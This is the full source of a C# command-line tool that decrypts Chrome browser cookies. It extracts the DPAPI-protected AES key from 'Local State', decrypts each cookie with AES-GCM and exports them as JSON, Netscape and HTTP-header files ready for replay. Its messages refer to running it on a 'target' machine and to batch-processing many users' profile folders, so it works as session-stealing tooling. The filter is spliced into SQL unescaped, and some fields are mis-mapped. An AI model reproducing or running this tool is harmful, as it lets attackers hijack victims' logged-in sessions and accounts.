using Microsoft.Data.Sqlite;
using System.Security.Cryptography;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Json.Serialization;


public class CookiesDecryptor
{
    class LocalStateDto
    {
        [JsonPropertyName("os_crypt")]
        public OsCrypt OsCrypt { get; set; }
    }

    class OsCrypt
    {
        [JsonPropertyName("encrypted_key")]
        public string EncryptedKey { get; set; }
    }

    public class CookieContainer
    {
        public string name, path, domain, value, decrypted_value, is_secure, is_http_only, creation_utc, expires_utc, last_access_utc;
        public CookieContainer(string name, string path, string domain, string value, string decrypted_value, string is_secure, string is_http_only, string creation_utc, string expires_utc, string last_access_utc)
        {
            this.name = name;
            this.path = path;
            this.domain = domain;
            this.value = value;
            this.decrypted_value = decrypted_value;

            if (is_secure == "1")
            {
                is_secure = "true";
            }
            if (is_secure == "0")
            {
                is_secure = "false";
            }
            this.is_secure = is_secure;

            if (is_http_only == "1")
            {
                is_http_only = "true";
            }
            if (is_http_only == "0")
            {
                is_http_only = "false";
            }
            this.is_http_only = is_http_only;
            this.creation_utc = creation_utc;
            this.expires_utc = expires_utc;
            this.last_access_utc = last_access_utc;
        }

        public string CalculateUNIXTime(string time)
        {
            // Chrome's cookies timestap's epoch starts 1601-01-01T00:00:00Z
            // So you need to divide by 1M and substract 11644473600
            // Do not ask me why

            return (Math.Round((Int64.Parse(expires_utc) / 1000000.0) - 11644473600)).ToString();
        }

        public string GetCookieActualValue()
        {
            // Stub if some values gonna be unencrypted
            var value = this.value;
            if (this.decrypted_value.Length > 0)
            {
                value = this.decrypted_value;
            }
            return value;
        }

        public string GetNetScapeCookieString()
        {
            // Based on https://docs.cyotek.com/cyowcopy/1.10/netscapecookieformat.html
            return $"{this.domain}\t{this.is_http_only}\t{this.path}\t{this.is_secure}\t{this.CalculateUNIXTime(this.expires_utc)}\t{this.name}\t{this.GetCookieActualValue()}";
        }
    }

    private const string LocalStateFileName = "Local State";

    public static ICollection<CookieContainer> GetCookies(string baseFolder, string cookiesFileLocation, string commandText)
    {
        byte[] key = GetKey(baseFolder);
        if (key == null)
        {
            // Console.WriteLine($"Warn: No key in {baseFolder}");
            return new List<CookieContainer> { };
        }

        ICollection<CookieContainer> cookies = ReadFromDb(baseFolder, key, cookiesFileLocation, commandText);
        return cookies;

    }

    private static byte[] GetKey(string baseFolder)
    {
        string file = Path.Combine(baseFolder, LocalStateFileName);
        if (!File.Exists(file))
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Warn: Local State file doesn't exist at path {file}");
            Console.ResetColor();
            return null;
        }
        string localStateContent = File.ReadAllText(file);
        LocalStateDto localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
        string encryptedKey = localState?.OsCrypt?.EncryptedKey;

        var keyWithPrefix = Convert.FromBase64String(encryptedKey);
        var key = keyWithPrefix[5..];

        try
        {
            return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            var code = ex.HResult.ToString("X8");
            Console.WriteLine($"Error at folder {baseFolder}: [code {code}] {ex.GetType().FullName}: {ex.Message}");
            Console.ResetColor();

            // Learn more about this error at https://learn.microsoft.com/en-us/troubleshoot/sql/reporting-services/error-message-report-server-service-start
            if (code == "8009000B")
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("It seems, that this AES key can't be decrypted on your local machine. Try to tun this tool on target one.");
                Console.ResetColor();
            }

            return null;
        }
    }

    private static string SafeGetString(SqliteDataReader reader, string columnName)
    {
        try
        {
            return reader[columnName]?.ToString() ?? string.Empty;
        }
        catch
        {
            return string.Empty;
        }
    }
    private static ICollection<CookieContainer> ReadFromDb(string baseFolder, byte[] key, string cookiesFileLocation, string commandText)
    {


        ICollection<CookieContainer> result = new List<CookieContainer>();
        string dbFileName = Path.Combine(baseFolder, cookiesFileLocation);
        using (SqliteConnection connection = new SqliteConnection($"Data Source={dbFileName}"))
        {
            connection.Open();

            SqliteCommand command = connection.CreateCommand();
            command.CommandText = commandText;

            using (SqliteDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    string name = SafeGetString(reader, "name");
                    string path = SafeGetString(reader, "path");
                    string domain = SafeGetString(reader, "host_key");
                    string value = SafeGetString(reader, "value");
                    string is_secure = SafeGetString(reader, "is_secure");
                    string is_http_only = SafeGetString(reader, "is_httponly");
                    string creation_utc = SafeGetString(reader, "creation_utc");
                    string expires_utc = SafeGetString(reader, "expires_utc");
                    string last_access_utc = SafeGetString(reader, "expires_utc");

                    byte[] encrypted_value = reader["encrypted_value"] as byte[] ?? [];
                    string decrypted_value = "";

                    if (encrypted_value.Count() > 0)
                    {
                        if (encrypted_value.Count() < 32)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"Error: Cookie named '{name}' got unusual encrypted_value size: {encrypted_value.Count()} bytes (min is 32 bytes)");
                            Console.ResetColor();
                        }
                        else
                        {
                            try
                            {
                                decrypted_value = DecryptCookie(key, encrypted_value);
                            }
                            catch (Exception ex)
                            {
                                // TODO: hook exception code 80131501 when encrypted_value is corrupted.
                                // Message: The computed authentication tag did not match the input authentication tag

                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"Error in decrypting cookie named '{name}': [code {ex.HResult.ToString("X8")}] {ex.GetType().FullName}: {ex.Message}");
                                Console.ResetColor();
                            }

                        }
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"Warn: Cookie named '{name}' isn't encrypted (encrypted_value size is 0)");
                        Console.ResetColor();
                    }
                    CookieContainer cookie = new CookieContainer(
                        name,
                        path,
                        domain,
                        value,
                        decrypted_value,
                        is_secure,
                        is_http_only,
                        creation_utc,
                        expires_utc,
                        last_access_utc
                        );
                    result.Add(cookie);
                }
            }

            return result;
        }
    }

    private static string DecryptCookie(byte[] masterKey, byte[] cookie)
    {
        // Minumum cookie byte[] size is 32.

        byte[] nonce = cookie[3..15];
        byte[] ciphertext = cookie[15..(cookie.Length - 16)];
        byte[] tag = cookie[(cookie.Length - 16)..(cookie.Length)];

        byte[] resultBytes = new byte[ciphertext.Length];

        using AesGcm aesGcm = new(masterKey);
        aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);

        return Encoding.UTF8.GetString(resultBytes);
    }

    static void Main(string[] args)
    {
        const string jsonCookiesFile = "Cookies_json.txt";
        const string httpCookiesFile = "Cookies_http.txt";
        const string netscapeCookiesFile = "Cookies_netscape.txt";

        Console.ResetColor();

        if (args.Count() <= 1 || args.Count() >= 4 || (args.Count() == 1 && args[0] == "help") || (args.Count() > 1 && args[1] == "help"))
        {
            Console.WriteLine($"Usage: <path> <method> [argument]");
            Console.WriteLine("");
            Console.WriteLine("<path>: Directory path, depends on method.");
            Console.WriteLine("<method>:");
            Console.WriteLine($"    decrypt — decrypts Cookie file at user profile path in '<path>\\Default\\Network\\Cookie' and saves them to {jsonCookiesFile}, {httpCookiesFile}, {netscapeCookiesFile} files at <path> directory.");
            Console.WriteLine($"    decrypt-show — same as decrypt, but also types out all decoded cookies.");
            Console.WriteLine($"    decrypt-profiles — decrypts Cookie files in all profile folder in '<path>' directory and saves them to files as above but at <path>\\<profile> folder. Use it when you got a lot of user profiles in 1 directory.");
            Console.WriteLine($"    decrypt-profiles-show — same as decrypt-profiles, but also types out all decoded cookies.");
            Console.WriteLine($"    [decrypt|decrypt-show|decrypt-profiles|decrypt-profiles-show] <filterWord>  — same as above, but also filters cookie's host by mask *filterWord*.");
            Environment.Exit(1);
        }

        string path = args[0];
        string method = args[1].ToLower();
        string argument = args.Count() >= 3 ? args[2] : "";

        if (!Directory.Exists(path))
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"Folder doesn't exist: {path}");
            Console.ResetColor();
            Environment.Exit(1);
        }

        static void Decrypt(string profile_path, string filter, bool typeCookiesOut)
        {
            try
            {
                Console.WriteLine($"Processing {profile_path}");

                string sqlCommand = "select * from cookies";
                if (filter.Length > 0)
                {
                    sqlCommand += $" where host_key like \"%{filter}%\"";
                }

                // Stub if someone wants to recompile tool for using old browsers. I was implemented it before but have deleted after.
                ICollection<CookieContainer> cookies = GetCookies(profile_path, @"Default\Network\Cookies", sqlCommand);

                int cookiesCount = cookies.Count();
                if (cookiesCount > 0)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    Console.WriteLine($"Found {cookiesCount.ToString()} cookies. Saved them to the folder {profile_path}");
                    Console.ResetColor();

                    string contentNetscape = "";
                    List<string> httpArray = new List<string>();
                    List<Object> jsonArray = new List<Object>();

                    foreach (var cookie in cookies)
                    {
                        if (typeCookiesOut)
                        {
                            Console.WriteLine(cookie.GetNetScapeCookieString());
                        }

                        contentNetscape += cookie.GetNetScapeCookieString() + "\n";
                        httpArray.Add(cookie.name + "=" + cookie.GetCookieActualValue());

                        var jsonObject = new
                        {
                            domain = cookie.domain,
                            path = cookie.path,
                            secure = cookie.is_secure,
                            httpOnly = cookie.is_http_only,
                            expires = cookie.CalculateUNIXTime(cookie.expires_utc),
                            creation_utc = cookie.creation_utc,
                            last_access_utc = cookie.last_access_utc,
                            name = cookie.name,
                            value = cookie.GetCookieActualValue(),
                        };
                        jsonArray.Add(jsonObject);

                    }

                    string httpString = string.Join("; ", httpArray);
                    string jsonString = JsonSerializer.Serialize(jsonArray, new JsonSerializerOptions
                    {
                        WriteIndented = true,
                        Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping // Otherwise you will get chars like \u0022 instead of " inside of json string values
                    });

                    File.WriteAllText(Path.Combine(profile_path, jsonCookiesFile), jsonString);
                    File.WriteAllText(Path.Combine(profile_path, netscapeCookiesFile), contentNetscape);
                    File.WriteAllText(Path.Combine(profile_path, httpCookiesFile), httpString);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"No cookies found at {profile_path}");
                    Console.ResetColor();
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"No access to folder: {profile_path}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex}: {ex.Message}");
                Console.ResetColor();
            }
            return;
        }

        if (method == "decrypt")
        {
            Decrypt(path, argument, false);
            return;
        }

        if (method == "decrypt-show")
        {
            Decrypt(path, argument, true);
            return;
        }

        if (method == "decrypt-profiles" || method == "decrypt-profiles-show")
        {
            try
            {
                string[] directories = Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly);

                foreach (string directory in directories)
                {
                    if (method == "decrypt-profiles") { Decrypt(directory, argument, false); }
                    if (method == "decrypt-profiles-show") { Decrypt(directory, argument, true); }

                }
            }

            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"No access to folder: {path}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            return;
        }

        Console.WriteLine($"Unknown method: {method}. Type 'help' to see usage.");
    }
}